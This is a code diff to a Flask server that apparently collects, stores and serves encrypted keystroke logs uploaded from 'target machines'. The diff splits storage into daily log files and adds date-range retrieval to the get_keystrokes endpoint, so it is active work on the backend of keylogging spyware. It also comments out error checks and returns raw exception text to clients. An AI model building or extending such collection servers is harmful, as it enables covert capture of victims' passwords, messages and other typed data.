@@ -1,8 +1,8 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify,make_response
 from flask_cors import CORS
 from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, JWTManager
-import os, random,string,time, json
-from ToolBox import merge_dicts,decrypt
+import os, random,string,datetime, json
+from ToolBox import merge_dicts,decrypt,generate_log_filename,get_date_list
 
 app = Flask(__name__)
 CORS(app,supports_credentials=True)
@@ -32,8 +32,9 @@ def upload():
     log_data = machine_data["data"]
     machine_path = local_data[machine_sn]['path']
     os.makedirs(machine_path, exist_ok=True)
+    log_path = machine_path + '/'+generate_log_filename()
     try:
-        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
+        with open(log_path, 'r', encoding='utf-8') as f:
             try:
                 machine_exist_data = json.load(f)
             except json.JSONDecodeError:
@@ -42,7 +43,7 @@ def upload():
         machine_exist_data = []
     # machine_log = merge_dicts(machine_exist_data, log_data)
     machine_exist_data.append(log_data)
-    with open(machine_path + '/log.json', "w", encoding="utf-8") as f:
+    with open(log_path, "w", encoding="utf-8") as f:
         json.dump(machine_exist_data, f, ensure_ascii=False, indent=4)
 
     return jsonify({"status": "success"}), 200
@@ -94,36 +95,39 @@ def get_demo():
 @jwt_required()
 def get_keystrokes():
     machine_sn = request.args.get('machine_sn')
+    start_date = request.args.get('start_date')
+    end_date = request.args.get('end_date')
 
     if not machine_sn:
         return jsonify({"error": "invalid machine serial number"}), 400
+    if not start_date or not end_date:
+        return jsonify({"error": "invalid date range"}), 400
 
+    dates = get_date_list(start_date, end_date)
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
 
         if machine_sn not in data:
             return jsonify({"error":f"machine {machine_sn} not found"}),400
-
         machine_path = data[machine_sn]['path']
         key = data[machine_sn]["key"]
-        file_path = machine_path + "/log.json"
+        list_key_logs = []
+        for cur_date in dates:
+            file_path = machine_path + "/log_"+cur_date+".json"
 
-        if not os.path.exists(file_path):
-            return jsonify({"error":"logs file not found"}),400
+            # if not os.path.exists(file_path):
+            #     return jsonify({"error":"logs file not found"}),400
 
-        with open(file_path, 'r',encoding='utf-8') as f:
-            try:
-                key_logs = json.load(f)
+            with open(file_path, 'r',encoding='utf-8') as f:
+                list_key_logs+=json.load(f)
 
-            except Exception as e:
-                return jsonify({"error":"logs not found"}),400
-
+            # except Exception as e:
+            #     return jsonify({"error":"logs not found"}),400
 
         decrypt_data_list = [{decrypt(key,k): decrypt(key,v) for k, v in data.items()} for data in list_key_logs]
         merged_data = merge_dicts(*decrypt_data_list)
-        return jsonify({"logs":merged_data
-                        }), 200
+        return jsonify({"logs":merged_data}), 200
 
     except Exception as e:
         return jsonify({"error":str(e)}), 500
@@ -141,7 +145,7 @@ def get_target_machines_list():
     try:
         return jsonify(machines), 200
     except Exception as e:
-        return jsonify({"error": "server error"}), 500
+        return jsonify({"error": f"server error: {e}"}), 500
 
 @app.route('/login', methods=['POST'])
 def login():
